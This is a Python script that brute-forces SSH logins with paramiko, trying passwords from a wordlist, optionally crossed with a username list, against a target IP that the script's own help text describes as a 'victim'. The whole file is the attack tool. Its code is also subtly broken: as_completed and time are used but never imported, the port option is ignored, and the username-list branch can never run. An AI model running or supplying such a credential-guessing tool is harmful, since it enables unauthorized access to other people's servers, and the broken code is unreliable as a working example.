import sys
import paramiko
import os
from colorama import Fore, Style, init
import argparse
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

def connect_client(target,username,password,verbose):
	ssh_client =paramiko.SSHClient()
	ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		if verbose:
			print(f"{Fore.CYAN}[DEBUG] Trying password : {password}{Style.RESET_ALL}")
		ssh_client.connect(hostname=target,port=22,username=username,password=password)
		return 0
	except paramiko.AuthenticationException:
		return 1
	except Exception as e:
		print(f"{Fore.RED}[ERROR] Error happened: {e}{Style.RESET_ALL}")
		return 2
	finally:
		ssh_client.close()


def worker(target,username=None,password=None,verbose=False):
	response=connect_client(target=target,username=username,password=password,verbose=verbose)

	if response==0:
		print(f"{Fore.GREEN}[*] Credentials found - Username: {username} & Password: {password}{Style.RESET_ALL}")
		return True
	
	elif response==1 and args.verbose:
		print(f"{Fore.YELLOW}[-] Tried - Username:{username} & Password: {password}{Style.RESET_ALL}")
	
	return False		

def brute_force(target,usernames,passwords,threads,verbose):
				with ThreadPoolExecutor(max_workers=threads)as executor:
					if len(usernames)==1:
						# If only passwords are provided
						username=usernames[0]
						futures=[executor.submit(worker,target,username,password,verbose) for password in passwords ]
					else:
					    # If both usernames and passwords are provided (brute-force username and password)
						futures=[executor.submit(worker,target,username,password,verbose)for username in usernames for password in passwords]
					for future in as_completed(futures):
						result=future.result()
						if result:
							print("[INFO] Brute-Force Successful, stopping other attempts.")
							break
						time.sleep(0.5)
						
def main():
		parser=argparse.ArgumentParser(description="SSH Brute Force for Username & Password")
		parser.add_argument("-i","--target",required=True,help=" target IP address ")
		parser.add_argument("-p","--port",type=int,default=22,help="SSH port : (default: 22)")
		parser.add_argument("-w","--wordlist",required=True,help="wordlist file (Password Wordlist ) ")
		parser.add_argument("-u","--username",required=True,help="Username of the victim ")
		parser.add_argument("-ulist","--userlist",help="Username Wordlist ")
		parser.add_argument("-T","--threads",type=int,default=5,help="Number of threads (default: 5)")
		parser.add_argument("-v","--verbose",action="store_true",help="Enable Verbose for debugging")

		global args
		args=parser.parse_args()
		if args.username:
			usernames=[args.username]
		elif args.userlist:
			with open(args.userlist,'r')as uf:
				usernames=uf.read().splitlines()
		else:
			print(f"{Fore.RED}[ERROR] Either username or user wordlist is required {Style.RESET_ALL} ")
			sys.exit(1)

		with open(args.wordlist,'r')as wf:
			passwords=wf.read().splitlines()

		brute_force(args.target,usernames,passwords,args.threads,args.verbose)

if __name__=="__main__":
	main()				

